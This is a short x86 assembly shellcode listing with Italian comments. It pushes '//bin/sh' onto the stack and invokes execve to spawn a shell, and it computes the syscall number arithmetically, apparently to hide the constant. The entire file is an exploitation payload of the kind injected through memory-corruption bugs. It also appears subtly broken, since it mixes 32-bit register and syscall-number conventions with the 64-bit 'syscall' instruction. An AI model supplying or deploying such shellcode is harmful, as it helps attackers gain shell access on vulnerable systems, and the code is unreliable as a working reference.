
section .text
	global _start
_start:
	; Push "/bin/sh" sullo stack
	xor eax, eax
	push eax		; \0
	mov eax, 0x68732f6e	; hs/n
	push eax
	mov eax, 0x69622f2f	; ib//
	push eax

	; sys_execve("/bin/sh", NULL, NULL)
	mov eax, 1112311545
	sub eax, 1112311535
	add eax, 1
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	syscall

